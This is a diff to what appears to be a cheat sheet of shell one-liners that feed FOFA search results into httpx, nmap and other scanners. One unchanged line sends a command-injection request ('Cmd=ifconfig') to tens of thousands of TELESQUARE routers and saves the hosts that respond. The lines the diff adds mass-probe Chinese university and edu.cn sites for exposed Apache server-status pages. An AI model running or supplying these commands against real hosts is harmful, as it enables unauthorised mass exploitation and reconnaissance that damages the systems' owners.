@@ -14,6 +14,8 @@ fofax -q 'domain="baidu.com"' |httpx -path "/favicon.ico" -mc 200>baidu.txt
 
 echo '(app=TELESQUARE-TLR-2005KSH)' | fofax -fs 59000 -ffi | httpx -path '/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig' -mr addr -t 700 >> rout_vuln.txt
 echo '(title="职业学院" || title="大学" || title="职业技术学院" || title="学院") && country="CN"' | fofax -ff 'domain' -fs 10 | naabu
+echo '(title="职业学院" || title="大学" || title="职业技术学院" || title="学院") && country="CN"' | fofax -fs 5000 -ffi | httpx -path '/server-status' -mr 'name=' -t 700
+echo 'host="edu.cn" && country="CN"' | fofax -fs 5000 -ffi | httpx -path '/server-status' -mr 'name=' -t 700
 nmap -iL <(echo 'app="APACHE-Solr"' | fofax -fs 10 -ff ip)
 ./dismap -file <(echo 'title="login"' | fofax -fs 10 -ffi)
 fofax  -q 'title="Apache APISIX Dashboard"' -ffi|httpx -title
